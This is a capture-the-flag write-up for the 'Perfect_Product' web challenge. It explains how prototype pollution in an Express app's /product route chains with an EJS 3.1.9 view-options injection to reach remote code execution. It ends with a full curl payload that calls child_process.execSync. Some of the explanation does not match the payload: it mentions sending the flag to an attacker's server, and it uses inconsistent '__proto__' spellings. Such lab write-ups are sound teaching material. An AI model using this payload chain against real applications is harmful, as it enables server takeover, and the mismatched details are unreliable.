# Perfect_Product

## Challenge description:
+ Check out my newest product gallery.
+ Source given

## Analysis
+ This application allows us to add a new product, view the existing product's details and print the product details

Breaking down the source code:
+ This application is using ejs as the engine to enable the use of ejs templates for rendering dynamic content
+ The products array holds the information about different products. Each product has properties like name, description,price,tax,country and image
+ While adding a product, if any of these paramters are missing or not of type string, it sends with the response as "bad_request". Other new product will be added and rendered
+ in /product, `Object.assign` is used to merge `req.query` and `req.body` objects into the params object without validation
+ 
```
const params = req.query || {};
Object.assign(params, req.body || {});
```
If we include a malicious payload in the request parameters, they can manipulate the `params` objects and modify the prototype.
It first initializes the params object with the query parameters (req.query) or an empty object if no query parameters are present. Then, it uses Object.assign() to merge the request body (req.body) with the params object.

```
 if(!(strings instanceof Array) && !Array.isArray(strings)){
    strings = ['NaN', 'NaN', 'NaN', 'NaN', 'NaN'];
  }
```
+ The purpose of this code snippet seems to ensure that the strings variable is always an Array. If it is not an Array, it initializes it with the default values ['NaN', 'NaN', 'NaN', 'NaN', 'NaN'].
+ From the source code we can understand that the version of ejs is 3.1.9. This version of ejs is vulnerable to server side template injection.<br>
refer: https://github.com/mde/ejs/issues/735
+ So, basically ejs template injection will be possible along with the prototype pollution in params in /product.
+ So, normally while doing prototype pollution, we set __proto__ as something like
http://localhost:5001/?__proto__[propertyName]=propertyValue. To check whether the requried object got affect or not, we can check if the propertyName exists in the object's prototype chain. You can do this by using the hasOwnProperty method. For example: obj.hasOwnProperty('propertyName'). If the result is true, it means the propertyName was added or modified due to the prototype pollution attack.

+ But in this challenge we can do like this because of a check for Array, so you had to create a complex object which is an array at the same time. So, we set the value in like this: `v[__proto__]=1`(This payload aims to pollute the __proto__ property with the value 1.). This also called prototype poisoning.
refer: Prototype Poisoning.
https://security.snyk.io/vuln/SNYK-JS-QS-3153490
As given in the above link the first part of the payload could possibly be:
`?name=myname&v[__proto__]&v[__proto__]&v[length]=4&v[0]=0&v[1]=1&v[2]=2&v[3]=3`.It sets the __proto__ property to an array with the values [0, 1, 2, 3].
+ This basically the first part of the challenge.
+ The second part of the challenge is basically overwriting the view options which in turn will allow js injection in compiled ejs templates
+ EJS is a popular templating engine that allows embedding JavaScript code within HTML templates. These templates are usually compiled server-side to generate dynamic HTML that is then sent to the client.
The "view options" in EJS refer to configuration settings that control how the templates are compiled and rendered. These options can include various settings related to template rendering, such as escaping HTML entities or enabling strict mode
+ refer this cve: https://github.com/mde/ejs/issues/735
second part of the payload will be: `v[_proto__][client]=1&v[_proto__][settings][view+options][escapeFunction]=JSON.stringify;process.mainModule.require("child_process").execSync("/readflag").`
_proto__[settings][view options][escapeFunction] property to a string that includes JavaScript code to execute. In this case, it uses JSON.stringify to stringify a function that executes a command to read the flag using curl and sends it to the attacker's server.
+ Coming to the third part of the challenge, templating engines, including EJS, often cache compiled templates for performance reasons. When a template is compiled, it is typically stored in memory for subsequent use.
+ Third part of the payload: `v[proto_][cache]`
+ If you don't include the "v[proto_][cache]" property in the payload, the template engine's cache will not be reset. This means that the previously compiled version of the template might still be used.
<br>
So, the final payload looks like:
```
curl -g 'http://localhost:5001/product?name=myname&v[__proto__]&v[__proto__]&v[length]=4&v[0]=0&v[1]=1&v[2]=2&v[3]=3&v[_proto__][client]=1&v[_proto__][settings][view+options][escapeFunction]=JSON.stringify;process.mainModule.require("child_process").execSync("/readflag")&v[_proto__][cache]'
```
